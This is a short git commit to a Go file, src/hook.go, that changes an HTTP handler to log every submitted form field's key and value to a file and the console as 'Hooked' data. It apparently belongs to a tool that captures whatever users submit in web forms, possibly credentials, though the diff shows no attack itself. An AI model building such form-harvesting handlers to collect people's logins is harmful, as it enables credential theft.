b4c8a13e3a76a384a42ff81f2936577f21743cfe
diljithishere <diljithisonlinenow@gmail.com>
2018-06-07 23:03:25 +0530

    logging corrected
    logging corrected

--- src/hook.go
+++ src/hook.go
@@ -95,10 +95,10 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 			logf, err := os.OpenFile("logs/alllogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
 			checkerr(err)
 			defer logf.Close()
-			for _, values := range req.Form { // range over map
+			for key, values := range req.Form { // range over map
 				for _, value := range values { // range over []string
-					logf.WriteString(value + "\n")
-					fmt.Println("Hooked value " + value)
+					logf.WriteString(key + " " + value + "\n")
+					fmt.Println("Hooked key " + key + " Value " + value)
 				}
 			}
 
